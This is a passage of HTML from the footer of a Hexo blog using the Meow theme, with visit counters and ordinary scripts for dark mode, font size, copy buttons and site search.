target="_blank">Hexo</a><span> &amp; </span><a href="https://github.com/chanwj/hexo-theme-meow" target="_blank" title="v2.1.0">Theme Meow</a></div><div class="pageview-site"><span id="busuanzi_container_site_pv">总访问量 : <span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner"></i></span></span><span id="busuanzi_container_site_uv">总访客数 : <span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner"></i></span></span></div></div></footer>
<script>const GLOBAL_CONFIG = {
  comment: { theme: 'preferred_color_scheme'}
}
</script>
<script src="/js/third-party/darkmode.js"></script>
<script>var options = {
  dark: '/css/darkmode.css',
  startAt: '24:00',
  endAt: '06:00',
  checkSystemScheme: 'false',
  saveOnToggle: 'true'
};
var darkMode = new DarkMode(options);
// change comment theme synchronously 同步修改评论区主题
if (darkMode.getMode() == "dark" && (true || true)) {
  if (document.getElementById('comment')) {
    document.getElementById('comment').getElementsByTagName('script')[0].setAttribute('data-theme', 'noborder_dark');
  }
}
</script><script>if (localStorage.getItem('font-size')) {
  document.querySelector('.post-content').style.fontSize = localStorage.getItem('font-size') + 'px';
}
</script>
<script src="/js/theme/tool-bar.js"></script>


<script src="/js/theme/menu.js"></script>


<script src="/js/third-party/clipboard.min.js"></script>


<script src="/js/theme/copy.js"></script>
<script>copyCode();
</script>
<script src="/js/theme/reward.js"></script>

<script src="/js/jquery-3.7.1.min.js"></script>


<script src="/js/theme/search.js"></script>
<script>searchFunc('/search.xml', 'search-input', 'search-result');
</script></body></html>